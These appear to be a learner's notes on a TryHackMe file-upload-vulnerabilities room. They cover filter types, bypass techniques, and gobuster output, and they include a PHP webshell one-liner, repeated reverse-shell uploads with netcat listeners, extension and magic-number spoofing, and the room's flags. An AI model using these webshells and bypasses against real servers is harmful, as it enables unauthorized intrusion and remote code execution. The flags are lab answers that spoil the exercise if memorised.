# Upload Vulnerabilities


## Intro
- If not handled well, file uploads can result in full Remote Code Execution (RCE), webpage injection, and XSS or CSRF vulnerabilities
- If users are allowed to upload arbitrary files they can use the server to host illegal content or leak sensitive information


## General Methodology
- Enumeration is key
- Look at source code, scan with a directory bruteforcer like gobuster, intercept web requests with burpsuite, and check out browser extensions like wappalyser
- If client-side filtering is used for the upload then we can easily see the code and bypass it
- If server-side filtering is being used we need to experiment by uploading files
    - Burpsuite or OWASP Zap are helpful here


## Overwriting Existing Files
- When files are uplaoded, a range of checks should be performed to ensure that the file doesn't overwrite an already existing file
- Common practice is assigning a random name or with the data and time of uplaod added to the start or end of the original filename
- File permissions should be in place to prevent overwriting
### Overwriting the file
1. Go to the website, right click, and view page source
2. `<img src="images/mountains.jpg" alt="">` We see that the name of the image is "mountains.jpg'
3. Now we download an image, name it mountains.jpg, and upload the file
4. The flag we get is THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}


## Remote Code Execution (RCE)
- Allows us to execute code arbitratily on the web server
- Result of uploading a program written in the same language as the back-end of the website (or another language that the server understands and will execute)
    - Traditionally the language is php, but other now other back-end languages have become more common: Python Django and Javascript in Node.js
- 2 ways to achieve RCE: webshells and reverse shells
    - A fully featured reverse shell is ideal goal, but webshell may be the only option available
- General methodology: Upload a shell, activate it by nagivating to the file on the server or force the webapp to run it for us
- Simple php webshell
><?php
>    echo system($_GET["cmd"]);
>?>
### Reverse Shell
1. Use gobuster to find hidden directories `gobuster -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm`, /resources is probably used to store uploaded files
>root@ip-10-10-154-247:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://shell.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/27 01:57:10 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/index.php (Status: 200)
>/resources (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/27 01:57:13 Finished
>===============================================================

2. Edit the ip address and port on the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server
3. Start a netcat listener on the port specified in the script `nc -nvlp 6000`
4. Launch the script with `curl http://shell.uploadvulns.thm/resources/scriptName`
5. Go to the /var/www directory and cat the flag.txt file to find THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}


## Filtering
- Client Side Filtering
    - It's running on the user's browser, and is easy to bypass because user can manipulate code
- Server Side Filtering
    - More difficult to bypass because it's running on server, in most cases is impossible to bypass entirely
### Filtering Types
- Extension validation
    - Used to identify (in theory) the contents of a file
    - In practice they're very easy to change and spoof, but windows uses them to identify file types, while unix based systems use magic numbers
    - Filters that check for extensions either _blacklist_or _whitelist_ extensions; they have a list of extensions that are allowed, and block everything else
- File type filtering
    - More intensive than extension validation
    - 2 types of file type filtering
        - MIME (Multipurpose Internet Mail Extension) validation
            - Used as an identifier for files that are transferred as attachments over email and http(s)
            - MIME type for a file upload is attached in the header of the request
            - Follow the format `<type>/<subtype>`
                - "spaniel.jpg" would be "image/jpeg"
            - Because MIME is based on the extension of the file like extension validation, it's easy to bypass
        - Magic Number Validation
            - Are more accurate of determining the contents of a file, but are not impossible to spoof
            - Magic number is a string of bytes at the beginning of the file content that identifies the content
                - Many sources to view which string of bytes correlate with a certain file type [gist](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5), [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- File Length Filtering
    - Prevent huge files from being uploaded to the server
    - Will likely not cause issues when uploading shells, but alternative shells may need to be used depending on file size
- File Name Filtering
    - Files uploaded to a server should be unique
        - Either add a random aspect to file
        - Or check if a file with the same name exists and give an error if true
    - Files should be sanitised on upload to verify they don't contain any characters that could cause problems on the system
        - Null bytes or forward slashes on linux or control characters such as `;` or unicode characters
    - Files are unlikely to have the same file name once they are uploaded to server

- None of these are perfect; most of the time the filters will be used in conjunction with one another
- Different frameworks and languages come up with their own methods of filtering, and it's possible to encounter language specific exploits to appear
    - PHP
        - Until php5, it was possible to bypass an extension filter by appending a null byte
        - It was also possible to inject php code into the exif data of an image file and force the server to execute it
### Questions
1. php
2. whitelist
3. MIME type for csv files is text/csv


## Bypassing Client Side Filtering
- Easy to bypass because it's on the machine that you control
- 4 methods
    1. Turn off javascript in your browser
        - This will work if the site doesn't require js to provide basic functionality; if it does, then use other methods
    2. Intercept and modify the incoming page
        - Using burpsuite, intercept the incoming webpage and strip out the js filter before it can run
    3. Intercept and modify the file upload
        - Intercept the file upload after it's already passed and been accepted by the filter
    4. Send the file directly to the upload point
        - Use developer console or burpsuite to intercept a successful upload, see which parameters are being used, and emulate the upload with a malicious file with a tool like curl
### Exercise
1. View page source, we see a javescript file being included from 'assets/js/' called 'client-side-filter.js'
2. Enumerate website with gobuster: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://java.uploadvulns.thm`
>root@ip-10-10-53-163:~# gobuster  dir -w /usr/share/wordlists/dirb/common.txt -u http://java.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://java.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/28 19:07:11 Starting gobuster
>===============================================================
>/.htpasswd (Status: 403)
>/.hta (Status: 403)
>/.htaccess (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/images (Status: 301)
>/index.php (Status: 200)
>/server-status (Status: 403)
>===============================================================
>2021/11/28 19:07:14 Finished
>===============================================================
3. Navigate to http://java.uploadvulns.thm/assets/js/ and view 'client-side-filter.js'. We see that it's checking for a MIME type of "image/png"
>window.onload = function(){
>	var upload = document.getElementById("fileSelect");
>	var responseMsg = document.getElementsByClassName("responseMsg")[0];
>	var errorMsg = document.getElementById("errorMsg");
>	var uploadMsg = document.getElementById("uploadtext");
>	upload.value="";
>	upload.addEventListener("change",function(event){
>		var file = this.files[0];
>		responseMsg.style = "display:none;";
>		if (file.type != "image/png"){
>			upload.value = "";
>			uploadMsg.style = "display:none;";
>			error();
>		} else{
>			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
>			responseMsg.style="display:none;";
>			errorMsg.style="display:none;";
>			success();
>		}
>	});
>};
4. Set up [Burpsuite](https://tryhackme.com/resources/blog/setting-up-burp) to be able to capture traffic. After setting it up, reload http://java.uploadvulns.thm and the traffic should be displayed in the Proxy > Intercept tab. The webpage should appear to be loading indefinitely. Right click > Do Intercept > Response to this request, and you'll be able to see the html code that the server sent us
5. Delete the script tag that links the 'client-side-filter.js' to the html
6. Click Forward until the webpage finishes loading
7. Now prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server. There should be no error because we removed the filtering restrictions
8. Set up netcat with the port specified in the script `nc -nvlp 6000`
9. Execute the script with curl
10. `cat /var/www/flag.txt` to get THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}


## Bypassing Server Side Filtering: File Extensions
- We can't see server side filters, so we have to try to upload various files and examine the results
- We need to look for flaws in the filters and try to exploit them; enumerate and see what is allowed/blocked, then craft a payload that can pass the criteria the filter is looking for
- A few methods if a file is blocked by the filter
    - Look for other extensions that are associated with the file type and try those; some servers may not be configured to block all the file extensions
        - Ex. If .php is blocked, try .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar, etc.
    - If you know a file type that is accepted, try tricking the code by mixing up the extensions
        - Ex. If you know that .jpg is accepted but .php isn't, try .jpg.php
### Exercise
1. Enumerate `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://annex.uploadvulns.thm`
>root@ip-10-10-223-207:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://annex.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://annex.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/29 05:50:11 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/index.php (Status: 200)
>/privacy (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/29 05:50:14 Finished
>===============================================================
2. Download a jpg file and upload it to the website, and it gets accepted by the filter. From the gobuster results, /privacy seems to be suspicious, and when we check http://annex.uploadvulns.thm/privacy/ we see that our file has been saved to that directory
3. Prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and try to upload it, but it doesn't get accepted
4. Try the first method from this section, where we find alternative extensions for php files. Rename the script to have an extension of .php5 and try to upload it again. It gets accepted
5. Set up netcat listener on the port specified in script `nc -nvlp 6000`
6. Use curl to execute the file on the server `curl http://annex.uploadvulns.thm/privacy/2021-11-29-05-54-08-php-reverse-shell.php5`
7. Once you have a shell, use `cat /var/www/flag.txt` to get THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}


## Bypassing Server Side Filtering: Magic Numbers
- Magic numbers are more accurate than extensions and are a string of hex digits that are placed at the beginning of a file
- Some filters use magic numbers to validate file uploads by comparing the first hex digits of a file to a whitelist/blacklist
- List of [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures)
- When trying to disguise a file as another file with magic numbers:
    1. Find the magic numbers of the file that you're trying to spoof as
    2. Open the file in a hex editor. I've found that [ghex](https://wiki.gnome.org/Apps/Ghex) is really easy to use
    3. Insert the magic numbers into the beginning of the file and save
### Exercise
1. Use gobuster to enumerate `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://magic.uploadvulns.thm`. We see that /graphics is forbidden (status 301) but we can assume that our uploaded files will be stored there
>root@ip-10-10-19-149:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://magic.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://magic.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/30 02:07:28 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.htpasswd (Status: 403)
>/.hta (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/graphics (Status: 301)
>/index.php (Status: 200)
>/server-status (Status: 403)
>===============================================================
>2021/11/30 02:07:31 Finished
>===============================================================
2. Prepare the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and try to upload it. We get an error that says that only gif files are allowed
3. Go to [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures) and find the magic numbers for gif files. We find 2 magic numbers, but we'll just use the first one for GIF87a, which is `47 49 46 38 37 61`
4. Open the reverse shell script with a hex editor (I used [ghex](https://wiki.gnome.org/Apps/Ghex)) and insert the magic number into the beginning of the file
    - Note: For ghex you have to Edit > Check Insert Mode to be able to insert
5. Now try to upload and it'll work
6. Set up netcat listener with the port set in the reverse shell script: `nc -nvlp 6000`
7. If we try to access the /graphics directory we get a forbidden error, so we access the file directly (hoping that the server didn't change the name of the file) with `curl http://magic.uploadvulns.thm/graphics/php-reverse-shell.php`
8. Find the flag `cat /var/www/flag.txt`, THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}


## Example Methodology
- I'm going to paste the exact paragraph from tryhackme because I know I'm going to refer back to it later on
>We've seen various different types of filter now -- both client side and server side -- as well as the general methodology for file upload attacks. In the next task you're going to be given a black-box file upload challenge to complete, so let's take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you're new to this kind of attack, you may find the following information useful.
>
>We'll look at this as a step-by-step process. Let's say that we've been given a website to perform a security audit on.
>
>The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
>Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
>We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
>An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
>Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
>Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:
>
>If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
>Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
>As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
>Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.
>You should now be well equipped to take on the challenge in task eleven.


## Challenge
1. Use gobuster to enumerate: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://jewel.uploadvulns.thm/`. We find that the only ones we can access are /admin, /Admin, and /ADMIN. All three lead to the same directory, and we see that the admin page states, "As a reminder: use this form to activate modules from the /modules directory." We can assume that files we upload will go to the /modules directory, and after we upload the reverse shell we can activate it from this page. There seems to be a 25 character limit to the input in the admin page `<input type=text name=cmd placeholder="Enter file to execute" maxlength=25>`, so make sure to keep the names+extensions of files below 25
>root@ip-10-10-94-8:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://jewel.uploadvulns.thm/
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://jewel.uploadvulns.thm/
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/30 06:23:16 Starting gobuster
>===============================================================
>/admin (Status: 200)
>/Admin (Status: 200)
>/ADMIN (Status: 200)
>/assets (Status: 301)
>/content (Status: 301)
>/Content (Status: 301)
>/modules (Status: 301)
>===============================================================
>2021/11/30 06:23:22 Finished
>===============================================================
2. Look at the page source for the landing page and we see that the input accepts files with MIME type of "image/jpeg" `<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">`. Since this is client side filtering, we can use burpsuite to circumvent if necessary
3. Now that we know that the client side filter only accepts jpg, we can try to pass it by removing the restriction with burpsuite. Follow the same procedure as when we used burpsuite to bypass client side filtering
